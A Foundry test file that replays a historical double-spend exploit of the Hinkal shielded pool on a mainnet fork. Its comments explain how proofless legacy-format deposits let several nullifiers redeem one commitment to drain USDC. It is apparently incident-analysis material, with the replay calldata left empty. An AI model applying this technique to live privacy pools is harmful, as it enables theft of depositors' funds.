pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$800K–$822K USDC (+ multi-asset campaign)
// PoC scope : 50,000 USDC — two consecutive public withdrawals of 25,000 USDC each
//             after a single 25,000 USDC legacy prooflessDeposit (block 25448306).
// Attacker  : 0xbB3f01a1b1C68F3DEB36C55342b5F5706c32fc20
// Pool      : 0x25e5e82f5702A27C3466fE68f14abDbbAdFca826 (Hinkal proxy)
// Impl      : 0x94c88fbf1a756012d405057ee6f3ea8578f28de1
// Deposit   : https://etherscan.io/tx/0xbf7252af56be8867a12e27cc332f85e8f39e906756e559d6a076dc8bd9d50008
// Withdraw1 : https://etherscan.io/tx/0x93aeb876ebb375fe04d5d1fde3bb1a0fcb9335c232e819deb021ad302aa1edc9
// Withdraw2 : https://etherscan.io/tx/0x009e268bea351ff8a35b4051c104ac025d8ea2fda6eb00d2448ba17de52f2046
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x25e5e82f5702a27c3466fe68f14abdbbadfca826#code
//
// @Analysis
// Hinkal shielded pool double-spend via legacy note format + multi-nullifier.
// 1. prooflessDeposit() inserts a commitment built from caller-supplied stealth
//    address fields without requiring a ZK proof, and without rejecting the
//    legacy note format (isNewStyle bit = 0 in extraRandomization).
// 2. The legacy stealthAddress binds nk only through the product e*nk, while
//    nullifiers are derived from nk directly. Different (e,nk) pairs can keep
//    the same commitment while producing distinct nullifiers.
// 3. The on-chain contract only checks proof validity, Merkle root existence,
//    and that each nullifier is fresh — it cannot detect that multiple
//    nullifiers redeem the same leaf. Circuits are closed-source; this PoC
//    replays historical calldata that the live verifier already accepted.
//
// PoC strategy (teaching replay):
//   Fork at block 25448344 — after the 25k legacy deposit and intermediate
//   private note/nullifier setup, before the public 25k USDC exits.
//   Replay two historical transact() calldatas with distinct nullifiers.
//   Each pays 25,000 USDC to the attacker EOA → 50,000 USDC total without a
//   second deposit. Full campaign repeated this pattern ~30× for ~$750k+ USDC.

address constant ATTACKER = 0xbB3f01a1b1C68F3DEB36C55342b5F5706c32fc20;
address constant HINKAL   = 0x25e5e82f5702A27C3466fE68f14abDbbAdFca826;
address constant USDC     = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

// First public 25k drain is in block 25448345; fork one before.
uint256 constant FORK_BLOCK = 25_448_344;
// Two × 25_000e6 USDC
uint256 constant EXPECTED_PROFIT = 50_000e6;

contract Hinkal_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Online warm: exhaustive_warm rewrites localhost <-> mainnet alias.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(HINKAL, "Hinkal");
        vm.label(USDC, "USDC");

        uint256 beforeBal = IERC20(USDC).balanceOf(ATTACKER);
        uint256 poolBefore = IERC20(USDC).balanceOf(HINKAL);
        require(poolBefore >= EXPECTED_PROFIT, "pool USDC too low for two 25k exits");

        // Historical transact() calldata (selector 0x979a77a8) — each carries a
        // distinct nullifier that the closed-source verifier accepted for notes
        // derived from the single 25k legacy prooflessDeposit.
        bytes memory withdraw1 = hex"";
        bytes memory withdraw2 = hex"";

        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok1, bytes memory ret1) = HINKAL.call(withdraw1);
        require(ok1, string(ret1));
        (bool ok2, bytes memory ret2) = HINKAL.call(withdraw2);
        require(ok2, string(ret2));
        vm.stopPrank();

        uint256 profit = IERC20(USDC).balanceOf(ATTACKER) - beforeBal;
        uint256 poolLost = poolBefore - IERC20(USDC).balanceOf(HINKAL);

        assertEq(profit, EXPECTED_PROFIT, "attacker USDC profit mismatch");
        assertEq(poolLost, EXPECTED_PROFIT, "pool USDC drain mismatch");

        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        emit log_named_decimal_uint("Hinkal pool USDC lost", poolLost, 6);
        emit log_named_uint("Public exits replayed", 2);
        emit log_named_decimal_uint("USDC per exit", 25_000e6, 6);
    }
}
